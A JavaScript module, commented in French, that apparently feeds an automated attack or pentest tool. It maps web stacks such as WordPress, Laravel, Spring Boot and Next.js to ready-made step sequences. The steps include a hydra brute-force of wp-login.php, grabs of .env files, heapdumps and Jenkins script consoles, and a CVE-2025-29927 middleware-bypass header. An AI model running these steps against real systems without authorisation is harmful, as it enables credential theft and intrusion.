// ════════════════════════════════════════════════════════════════
//  📖 PLAYBOOKS — Tech-specific playbooks + fingerprint matcher
//  Quand on detecte une stack (WordPress, Django, Spring, Next.js,
//  Laravel, Drupal, Magento, Node-Express, Rails, FastAPI...), on
//  injecte un playbook cible : sequence optimale de tools/checks
//  deja connue pour cette techno. Transforme la phase exploit
//  generique en attaque spe-fondue.
// ════════════════════════════════════════════════════════════════

const PLAYBOOKS = {
    wordpress: {
        label: 'WordPress',
        fingerprints: {
            headers: [/x-powered-by.*wordpress/i, /link:.*wp-json/i],
            html: [/wp-content|wp-includes|wp-json/i, /<meta name=["']generator["'] content=["']WordPress/i],
            paths: ['/wp-login.php', '/wp-json/', '/readme.html', '/wp-admin/', '/xmlrpc.php'],
            cookies: [/wordpress_|wp-settings/i],
        },
        steps: [
            { id: 'wp-enum', tool: 'wpscan', args: { url: '$target', enumerate: 'vp,vt,u,tt' }, rationale: 'enum plugins/themes/users vulnerables' },
            { id: 'wp-xmlrpc', tool: 'http_curl', args: { url: '$target/xmlrpc.php', method: 'POST', data: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' }, rationale: 'xmlrpc actif → amplification auth bruteforce + pingback SSRF' },
            { id: 'wp-rest-users', tool: 'http_curl', args: { url: '$target/wp-json/wp/v2/users' }, rationale: 'enum users via REST (souvent ouvert)' },
            { id: 'wp-readme', tool: 'http_curl', args: { url: '$target/readme.html' }, rationale: 'version WP exposee' },
            { id: 'wp-bruteforce', tool: 'hydra_http', args: { target: '$target', path: '/wp-login.php', params: 'log=^USER^&pwd=^PASS^&wp-submit=Log+In', fail_re: 'ERROR' }, exploit: true, rationale: 'bruteforce si liste users recoltee' },
        ],
        findingsHints: [
            'WP plugins populaires avec CVE : contact-form-7, elementor, woocommerce, yoast-seo, wp-file-manager, duplicator',
            'wp-admin accessible sans 2FA → priorite P1',
            'xmlrpc.php + ping amplification → DDoS vector a mentionner',
        ],
    },

    drupal: {
        label: 'Drupal',
        fingerprints: {
            headers: [/x-drupal-cache|x-generator.*drupal/i],
            html: [/<meta name=["']generator["'] content=["']Drupal/i, /sites\/default\/files/i],
            paths: ['/user/login', '/core/CHANGELOG.txt', '/?q=user'],
            cookies: [/SESS[a-f0-9]{32}/],
        },
        steps: [
            { id: 'drupal-version', tool: 'http_curl', args: { url: '$target/core/CHANGELOG.txt' }, rationale: 'version Drupal → mapping Drupalgeddon 1/2/3' },
            { id: 'drupal-nuclei', tool: 'nuclei', args: { target: '$target', tags: 'drupal' }, rationale: 'CVE templates Drupal' },
            { id: 'drupal-enum-modules', tool: 'ffuf', args: { url: '$target/modules/FUZZ/', wordlist: '/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.fuzz.txt' }, rationale: 'enum modules contribs' },
        ],
        findingsHints: [
            'Drupal < 7.58 ou < 8.5.1 → Drupalgeddon2 (CVE-2018-7600) RCE non-auth',
            'Drupal < 7.59 ou < 8.5.3 → Drupalgeddon3 (CVE-2018-7602)',
        ],
    },

    laravel: {
        label: 'Laravel',
        fingerprints: {
            headers: [/laravel_session|XSRF-TOKEN/i],
            html: [/<meta name=["']csrf-token/i],
            paths: ['/.env', '/storage/logs/laravel.log', '/telescope', '/horizon', '/_ignition/health-check'],
            errors: [/Whoops.*Laravel|Symfony\\\\Component|RuntimeException.*app\//],
        },
        steps: [
            { id: 'laravel-env', tool: 'http_curl', args: { url: '$target/.env' }, rationale: 'leak .env → APP_KEY + DB creds (jackpot)' },
            { id: 'laravel-telescope', tool: 'http_curl', args: { url: '$target/telescope' }, rationale: 'Telescope dashboard expose = debug info + requests' },
            { id: 'laravel-ignition', tool: 'http_curl', args: { url: '$target/_ignition/health-check' }, rationale: 'CVE-2021-3129 Ignition → RCE via debug mode' },
            { id: 'laravel-debug-mode', tool: 'http_curl', args: { url: '$target/404-non-existant-trigger' }, rationale: 'force erreur — si Whoops affiche stack = APP_DEBUG=true' },
        ],
        findingsHints: [
            'CVE-2021-3129 : Laravel <8.4.2 + Ignition facade-ignition <=2.5.1 + APP_DEBUG=true → RCE',
            '.env expose = APP_KEY → deserialization gadget chain possible',
        ],
    },

    django: {
        label: 'Django',
        fingerprints: {
            headers: [/csrftoken|sessionid/i],
            html: [/csrfmiddlewaretoken/i, /__admin_media_prefix__/i],
            paths: ['/admin/', '/admin/login/', '/__debug__/'],
            errors: [/DisallowedHost|Traceback.*django|DEBUG = True/],
        },
        steps: [
            { id: 'django-admin', tool: 'http_curl', args: { url: '$target/admin/login/' }, rationale: 'panel admin exposed ?' },
            { id: 'django-debug', tool: 'http_curl', args: { url: '$target/404-force-error' }, rationale: 'force erreur — leak DEBUG + stack + SETTINGS' },
            { id: 'django-debug-toolbar', tool: 'http_curl', args: { url: '$target/__debug__/' }, rationale: 'debug toolbar expose = SQL queries + env' },
        ],
        findingsHints: [
            'DEBUG=True en prod → leak SECRET_KEY + queries SQL + stack',
            'Admin panel sans 2FA + session cookie sans Secure → priorite P1',
            'CVE-2022-28346 ou similaires SQLi via QuerySet.annotate si input non-sanitized',
        ],
    },

    nextjs: {
        label: 'Next.js',
        fingerprints: {
            headers: [/x-powered-by.*next\.js|x-nextjs/i],
            html: [/__NEXT_DATA__|_next\/static/i],
            paths: ['/_next/static/', '/api/'],
        },
        steps: [
            { id: 'next-data', tool: 'http_curl', args: { url: '$target' }, rationale: '__NEXT_DATA__ dans HTML contient souvent props server-side avec donnees sensibles' },
            { id: 'next-api-enum', tool: 'gobuster', args: { url: '$target/api/', wordlist: '/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt' }, rationale: 'enum routes API' },
            { id: 'next-middleware-bypass', tool: 'http_curl', args: { url: '$target', headers: 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' }, rationale: 'CVE-2025-29927 bypass middleware auth' },
        ],
        findingsHints: [
            'CVE-2025-29927 : Next.js middleware bypass via header x-middleware-subrequest',
            '__NEXT_DATA__ = props SSR → souvent tokens/emails/API keys leakees',
        ],
    },

    spring: {
        label: 'Spring Boot',
        fingerprints: {
            headers: [/x-application-context/i],
            paths: ['/actuator', '/actuator/env', '/actuator/heapdump', '/actuator/mappings', '/env', '/trace'],
            errors: [/Whitelabel Error Page|org\.springframework/],
        },
        steps: [
            { id: 'spring-actuator', tool: 'http_curl', args: { url: '$target/actuator' }, rationale: 'actuator endpoints expose = env + heapdump + mappings' },
            { id: 'spring-env', tool: 'http_curl', args: { url: '$target/actuator/env' }, rationale: 'leak env vars → creds' },
            { id: 'spring-heapdump', tool: 'http_curl', args: { url: '$target/actuator/heapdump' }, rationale: 'heapdump → analyse offline avec visualvm = tokens en memoire' },
            { id: 'spring-nuclei', tool: 'nuclei', args: { target: '$target', tags: 'spring' }, rationale: 'Spring4Shell CVE-2022-22965 + dependancies' },
        ],
        findingsHints: [
            'Spring4Shell CVE-2022-22965 : Spring Core <5.3.18 → RCE via binding',
            '/actuator/heapdump non protege = dump memoire entier',
        ],
    },

    rails: {
        label: 'Ruby on Rails',
        fingerprints: {
            headers: [/x-powered-by.*phusion|server.*puma|_session_id/i],
            html: [/authenticity_token|csrf-param/i],
            paths: ['/rails/info/routes', '/rails/info/properties'],
            errors: [/Rails\.root|ActionController|NoMethodError.*ActiveRecord/],
        },
        steps: [
            { id: 'rails-routes', tool: 'http_curl', args: { url: '$target/rails/info/routes' }, rationale: 'si dev mode → toutes les routes exposees' },
            { id: 'rails-nuclei', tool: 'nuclei', args: { target: '$target', tags: 'rails' }, rationale: 'CVE templates Rails' },
        ],
        findingsHints: [
            'CVE-2019-5420 : Rails dev mode secret_key_base predictible → RCE via cookie deserialization',
            'Dev mode expose = debug mode = RCE probable',
        ],
    },

    magento: {
        label: 'Magento',
        fingerprints: {
            html: [/Mage\.Cookies|Magento_/i, /skin\/frontend\/|static\/frontend\//],
            paths: ['/admin', '/rest/V1/', '/customer/account/login/'],
        },
        steps: [
            { id: 'magento-nuclei', tool: 'nuclei', args: { target: '$target', tags: 'magento' }, rationale: 'Magecart + CVEs Magento' },
            { id: 'magento-rest', tool: 'http_curl', args: { url: '$target/rest/V1/products?searchCriteria[pageSize]=1' }, rationale: 'REST API accessible ?' },
        ],
        findingsHints: [
            'CVE-2022-24086 : Magento <2.4.3-p2 → RCE non-auth (Magentogeddon)',
            'Admin path par defaut = /admin → souvent garde = prioriser cible',
        ],
    },

    expressjs: {
        label: 'Node.js / Express',
        fingerprints: {
            headers: [/x-powered-by.*express/i],
            errors: [/at Object\.|node_modules|ENOENT|\[ERR_/],
        },
        steps: [
            { id: 'express-headers', tool: 'http_curl', args: { url: '$target', method: 'HEAD' }, rationale: 'headers X-Powered-By confirmes' },
            { id: 'express-proto-pollution', tool: 'nuclei', args: { target: '$target', tags: 'prototype-pollution,express' }, rationale: 'prototype pollution vectors' },
        ],
        findingsHints: [
            'Recherche __proto__ / constructor dans bodies JSON acceptes',
            'Si ejs / pug / handlebars → SSTI candidate',
        ],
    },

    fastapi: {
        label: 'FastAPI / Python',
        fingerprints: {
            headers: [/server.*uvicorn|server.*hypercorn/i],
            paths: ['/docs', '/redoc', '/openapi.json'],
        },
        steps: [
            { id: 'fastapi-docs', tool: 'http_curl', args: { url: '$target/docs' }, rationale: 'Swagger UI auto-genere = mapping complet' },
            { id: 'fastapi-openapi', tool: 'http_curl', args: { url: '$target/openapi.json' }, rationale: 'spec OpenAPI = tous endpoints + schemas' },
        ],
        findingsHints: [
            '/docs et /openapi.json exposes en prod = leak architecture totale',
            'Swagger permet test interactif → IDOR/authz test facile',
        ],
    },

    jenkins: {
        label: 'Jenkins',
        fingerprints: {
            headers: [/x-jenkins|x-hudson/i],
            html: [/Jenkins ver\./],
            paths: ['/jenkins/', '/script', '/manage', '/asynchPeople/', '/securityRealm/user/admin/'],
        },
        steps: [
            { id: 'jenkins-version', tool: 'http_curl', args: { url: '$target', method: 'HEAD' }, rationale: 'header X-Jenkins donne version' },
            { id: 'jenkins-script-console', tool: 'http_curl', args: { url: '$target/script' }, rationale: 'script console groovy = RCE si accessible' },
            { id: 'jenkins-users', tool: 'http_curl', args: { url: '$target/asynchPeople/' }, rationale: 'liste users' },
        ],
        findingsHints: [
            'CVE-2024-23897 : Jenkins <2.442 → arbitrary file read via CLI',
            '/script accessible sans auth = RCE groovy evaluate direct',
        ],
    },

    joomla: {
        label: 'Joomla',
        fingerprints: {
            html: [/<meta name=["']generator["'] content=["']Joomla/i, /\/components\/com_/i],
            paths: ['/administrator/', '/language/en-GB/en-GB.xml'],
        },
        steps: [
            { id: 'joomla-version', tool: 'http_curl', args: { url: '$target/language/en-GB/en-GB.xml' }, rationale: 'fichier XML version Joomla' },
            { id: 'joomla-nuclei', tool: 'nuclei', args: { target: '$target', tags: 'joomla' }, rationale: 'templates CVE Joomla' },
        ],
        findingsHints: [
            'CVE-2023-23752 : Joomla 4.0.0-4.2.7 → leak config via API non-auth',
        ],
    },
};

function _matches(patterns, value) {
    if (!value) return false;
    return patterns.some(p => p instanceof RegExp ? p.test(value) : String(value).includes(p));
}

// Accepte :
//   hostData = { headers, html, paths (tested + status), cookies, errors, tech (array) }
//   renvoie liste de playbooks matches tries par score
function matchPlaybooks(hostData = {}) {
    const matches = [];
    const techLower = (hostData.tech || []).map(t => String(t).toLowerCase());
    const headersBlob = JSON.stringify(hostData.headers || {}).toLowerCase();
    const htmlBlob = (hostData.html || '').toLowerCase();
    const cookiesBlob = JSON.stringify(hostData.cookies || []).toLowerCase();
    const errorsBlob = JSON.stringify(hostData.errors || []).toLowerCase();
    const availablePaths = hostData.paths || {};

    for (const [key, pb] of Object.entries(PLAYBOOKS)) {
        let score = 0;
        const reasons = [];

        // match direct sur tech declare
        if (techLower.some(t => t.includes(key) || t.includes(pb.label.toLowerCase()))) {
            score += 5;
            reasons.push(`tech=${pb.label}`);
        }
        // headers
        if (pb.fingerprints.headers && _matches(pb.fingerprints.headers, headersBlob)) {
            score += 3;
            reasons.push('header-match');
        }
        // html
        if (pb.fingerprints.html && _matches(pb.fingerprints.html, htmlBlob)) {
            score += 3;
            reasons.push('html-match');
        }
        // cookies
        if (pb.fingerprints.cookies && _matches(pb.fingerprints.cookies, cookiesBlob)) {
            score += 2;
            reasons.push('cookie-match');
        }
        // errors
        if (pb.fingerprints.errors && _matches(pb.fingerprints.errors, errorsBlob)) {
            score += 3;
            reasons.push('error-leak');
        }
        // paths (chemins testes qui ont 200/302 sont des hits)
        if (pb.fingerprints.paths) {
            for (const p of pb.fingerprints.paths) {
                const status = availablePaths[p];
                if (status && status < 400) {
                    score += 2;
                    reasons.push(`path:${p}`);
                }
            }
        }

        if (score > 0) {
            matches.push({ key, label: pb.label, score, reasons });
        }
    }
    matches.sort((a, b) => b.score - a.score);
    return matches;
}

function getPlaybook(key) {
    return PLAYBOOKS[key] || null;
}

function renderSteps(playbookKey, target) {
    const pb = PLAYBOOKS[playbookKey];
    if (!pb) return [];
    return pb.steps.map(s => ({
        id: `${playbookKey}-${s.id}`,
        tool: s.tool,
        args: Object.fromEntries(Object.entries(s.args).map(([k, v]) =>
            [k, typeof v === 'string' ? v.replace('$target', target) : v])),
        rationale: s.rationale,
        exploit: !!s.exploit,
    }));
}

function listPlaybooks() {
    return Object.entries(PLAYBOOKS).map(([k, pb]) => ({
        key: k, label: pb.label, steps: pb.steps.length, hints: pb.findingsHints.length,
    }));
}

module.exports = { PLAYBOOKS, matchPlaybooks, getPlaybook, renderSteps, listPlaybooks };
